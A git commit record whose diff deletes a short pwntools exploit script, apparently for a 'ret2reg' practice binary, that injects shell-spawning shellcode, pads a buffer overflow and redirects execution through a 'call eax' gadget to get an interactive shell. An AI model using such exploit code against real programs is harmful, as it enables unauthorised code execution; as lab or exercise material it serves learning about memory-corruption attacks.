f4517efb2afc931f363fb9bbc9f37ca91932dfc1
sirryLi <147589975+sirryLi@users.noreply.github.com>
2023-11-04 18:20:42 +0800

    Delete reg directory

--- reg/exp.py
+++
@@ -1,8 +0,0 @@
-from pwn import *
-
-
-shellcode = asm(shellcraft.sh())
-call_eax = p32(0x0804901d)
-payload = flat([shellcode , b'a'* (0x20c - len(shellcode) ),call_eax])
-io = process(argv=[ "./ret2reg",payload])
-io.interactive()
